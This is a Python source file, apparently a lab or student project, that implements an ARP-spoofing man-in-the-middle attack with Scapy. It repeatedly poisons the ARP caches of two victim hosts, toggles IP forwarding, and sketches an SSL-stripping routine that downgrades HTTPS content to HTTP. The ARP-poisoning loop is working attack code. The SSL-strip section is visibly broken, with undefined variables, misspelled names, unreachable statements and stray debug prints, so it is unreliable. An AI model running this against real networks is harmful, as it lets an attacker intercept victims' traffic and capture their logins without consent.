from scapy.all import *
from scapy.layers import *
from scapy.layers.inet import IP
from dns_spoofing import *
import scapy.all as scapy
from scapy.layers import http
import argparse
import threading
import time
import socket
import nmap
import os
import sys
from http import *

from getmac import get_mac_address
#from dns_spoofing import settings
from utils.interface import InterfaceConfig
# from utils.configuration import interface_config


class ARPSpoof(threading.Thread):
    SSL_Strip_Activation = False
    
    def disableForwarding(self):
    	path = "/proc/sys/net/ipv4/ip_forward"
    	forwarding = open(path, "w")
    	forwarding.write("0")
    	forwarding.close

    def enableForwarding(self):
    	path = "/proc/sys/net/ipv4/ip_forward"
    	forwarding = open(path, "w")
    	forwarding.write("1")
    	forwarding.close
 
    def __init__(
        self,
        interface_config: InterfaceConfig,
        victim1_ip,
        victim2_ip,
        mitm: bool = False,
        restore: bool = True,
        duckforce: bool = True,
    ):
        super().__init__()
        
        self.interface_config = interface_config
        self.victim1_ip = victim1_ip
        self.victim2_ip = victim2_ip
        self.mitm = mitm
        self.restore = restore
        self.duckforce = duckforce
        
        self._stop_event = threading.Event()
        
        # self.query_user()
        
    # overrides of Thread
    # DO NOT TOUCH
    def run(self):
        self.start_attack()
        
    def join(self, timeout=None):
        self._stop_event.set()
        super().join(timeout)
        

    def start_attack(self):
        if self.victim1_ip == '0.0.0.0':
            print("\n \nSet your Victim's IP Address")
            self.victim1_ip = input()

        VICTIM1_MAC = getmacbyip(self.victim1_ip)
        VICTIM2_MAC = getmacbyip(self.victim2_ip)

        if self.mitm:
            print("\n Enabling IP Forwarding (MitM attack)...")
            self.enableForwarding()
        else:
            # Disable ip forward
            self.disableForwarding()
            print("Disabled Forwarding")

        ATTACKER_MAC = '08:00:27:e0:e3:10' 
        #print(ATTACKER_MAC)
        tic = -1
        
        while not self._stop_event.is_set():
            
            # implemented non blocking timer
            toc = time.perf_counter()
            if (tic != -1) and (toc - tic < 15):
                continue
                
            tic = time.perf_counter()
                
                
            #Poisoning the Victim
            arp = Ether() / ARP()
            arp[Ether].src = ATTACKER_MAC
            arp[ARP].hwsrc = ATTACKER_MAC
            arp[ARP].psrc = self.victim2_ip
            arp[ARP].hwdst = VICTIM1_MAC
            arp[ARP].pdst = self.victim1_ip

            sendp(arp, iface='eth0')

            #Poison the Server
            arp = Ether() / ARP()
            arp[Ether].src = ATTACKER_MAC
            arp[ARP].hwsrc = ATTACKER_MAC
            arp[ARP].psrc = self.victim1_ip
            arp[ARP].hwdst = VICTIM2_MAC
            arp[ARP].pdst = self.victim2_ip
            sendp(arp, iface='eth0')

            print("(Re-)poisoned the ARP of the following IPs: " +
                  self.victim1_ip + " and " + self.victim2_ip)
            
            if self.duckforce == False:
                break
            
        return

    def process_sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            url = packet[http.HTTPRequest].Host
    
        
    def packet_forwarding(self):
        
        scapy.sniff("eth0",	prn=process_sniffed_packet)
        print("DAMEs RE") 
        #if packet.haslayer(http.HTTPResponse):
            #if(packet[http.HTTPResponse].Status_Code == "301") and (packet[http.HTTPResponse].Location[4] == "s"): #testing if the redirect is towards an httpS url
             #   print("location MOVED")            
        #print(packet.summary())
        print("DAME RE") 
        self.SSL_Strip_Activation = True
        if self.SSL_Strip_Activation:
            if packet.haslayer(http.HTTPRequest):
                self.ssl_strip(packet)
                print("DAME E") 
                print('SSL Strip started')
                return
                
            if packet.haslayer(TCP) and packet[TCP].dport == 80:
                flags_set = packet[TCP].flags
                if 'S' in flags_set:
                    response = IP() / TCP(flags = 'SA')
                    response[IP].dst = packet[IP].src
                    response[IP].src = packet[IP].dst
                    response[TCP].dport = packet[TCP].sport
                    response[TCP].sport = packet[TCP].dport
                    response[TCP].ack = packet[TCP].seq + 1
                    response[TCP].seq = 0
                    
                    send(response)
                    print('Response Sent!')
                    
                    
    def ssl_strip(self, packet):
        http_layer = packet[HTTPRequest]
        status, headers, data = self.new_https_request(http_layer)
        headers = { header: value.replace('https', 'http') for header, value in headers }
        data = data.replace('https', 'http')
        
        http_response = self.new_http_response(status, headers,data)
        
        segment_size = 1460
        response_parts = [http_response[i:i+segment_size] for i in range(0, len(http_reponse), segment_size)]
        
        read_bytes = packet[TCP].seq + len(packet[TCP].payload)
        sent_bytes = packet[TCP].ack
        
        for reply_part in response_parts:
            reply = IP(flags=2) / TCP() / HTTP() / reply_part
            reply[IP].dst = packet[IP].src
            reply[IP].src = packet[IP].dst
            reply[TCP].dport = packet[TCP].sport
            reply[TCP].sport = packet[TCP].dport
            reply[TCP].flags = "A"
            reply[TCP].seq = read_bytes
            reply[TCP].ack = sent_bytes
            
            sent_bytes = sent_bytes + len(reply_part)
            
            send(reply)
            print('Reply Sent!')
            
    def new_https_request(self, http_layer):
        host = http_layer.Host.decode('utf-8')                    #???
        method = http_layer.Method.decode('utf-8')		  #???
        path = http_layer.Path.decode('utf-8')			  #???
        
        connection = HTTPSConnection(host)
        connection.request(method, path, headers = {'Accept-Charset' : 'utf-8'})
        
        response = connection.getresponse()
        status = response.status
        headers = response.getheaders()
        data = response.read().decode('utf-8')
        
        return status, headers, data
        print('HTTPS request sent')
    
    
    def new_http_reponse(self, status, headers, data):
        response = f'HTTP/1.1 {status} \r\n'
        
        for header, value in header.items():
            if header.lower() in ['content-length', 'content-encoding']:
                continue
            response = response + f'{header}: {value}\r\n'
        
        response = response + f'Content-Length: {len(data) + 4}\r\n'     #???
        response = response + f'Content-Encoding: none\r\n'
        response = response + '\r\n'
        response = response + data
        response = response + '\r\n'
        
        return reponse
        print('HTTP response sent')

    def restore_arp(self):
        ATTACKER_MAC = '08:00:27:e0:e3:10'
        VICTIM1_MAC = getmacbyip(self.victim1_ip)
        VICTIM2_MAC = getmacbyip(self.victim2_ip)
        print(VICTIM1_MAC)
        print(VICTIM2_MAC)
        #print(ATTACKER_MAC)
        # Restore the ARP cache of the Victim
        arp = Ether() / ARP()
        arp[Ether].src = ATTACKER_MAC
        arp[Ether].dst = VICTIM2_MAC
        arp[ARP].hwsrc = VICTIM1_MAC
        arp[ARP].psrc = self.victim1_ip
        arp[ARP].hwdst = VICTIM2_MAC
        arp[ARP].pdst = self.victim2_ip
        sendp(arp, iface='eth0')


        # Restore the ARP cache of the Server
        arp = Ether() / ARP()
        arp[Ether].src = ATTACKER_MAC
        arp[Ether].dst = VICTIM1_MAC
        arp[ARP].hwsrc = VICTIM2_MAC
        arp[ARP].psrc = self.victim2_ip
        arp[ARP].hwdst = VICTIM1_MAC
        arp[ARP].pdst = self.victim1_ip
        sendp(arp, iface='eth0')

            

if __name__ == "__main__":
    try:
    	
        print("running..")
    except KeyboardInterrupt:
        print('Exiting program arpapr...')
        #restore_arp(self)
